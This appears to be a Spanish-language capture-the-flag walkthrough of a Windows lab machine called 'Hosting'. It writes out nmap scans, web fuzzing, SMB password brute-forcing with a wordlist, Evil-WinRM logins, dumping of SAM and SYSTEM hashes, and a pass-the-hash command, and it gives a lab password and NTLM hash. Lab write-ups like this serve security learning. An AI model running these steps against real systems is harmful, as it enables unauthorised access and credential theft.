# Máquina Hosting

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.21

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,135,139,445,5040,5985,7680,47001,49664-49669,61912 -vvv -Pn 10.0.2.21

![alt text](image-2.png)


### Fuzzing web

feroxbuster --url http://10.0.2.21/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-4.png)

como encontramos usuarios en la web pobré contraseñas con nxc

nxc smb 10.0.2.21 -u "p.smith" -p "/usr/share/wordlists/rockyou.txt" --ignore-pw-decoding

![alt text](image-3.png)

con las credenciales encontradas enumeramos otros usuarios:

![alt text](image-5.png)

ahora guardamos esos usuarios en un archivo users.txt y probamos con la contraseña enconntrada H0$T1nG123!

![alt text](image-6.png)

### Explotación

me conecté por Evil-WinRM ya que está abierto el puerto 5985

evil-winrm -i 10.0.2.21 -u "j.wilson" -p 'H0$T1nG123!'

![alt text](image-8.png)

### Escalar privilegios

luego ejecuté whoami /priv para ver los permisos

![alt text](image-7.png)

Hacemos una copia del archivo SAM que recordemos que contiene todos los usuarios y sus hashes NTLM en entornos de WORKSTATION y podemos copiar el registro system que es el que contiene la clave de encriptado del archivo SAM.

![alt text](image-9.png)

En kali utilicé impacket para ver el hash de cada usuario:

![alt text](image-10.png)

lo corroboré con nxc

nxc smb 10.0.2.21 -u administrator -H '41186fb28e283ff758bb3dbeb6fb4a5c'

![alt text](image-11.png)

me conecté con Evil-WinRM

![alt text](image-12.png)

### user.txt

![alt text](image-14.png)

### root.txt

![alt text](image-13.png)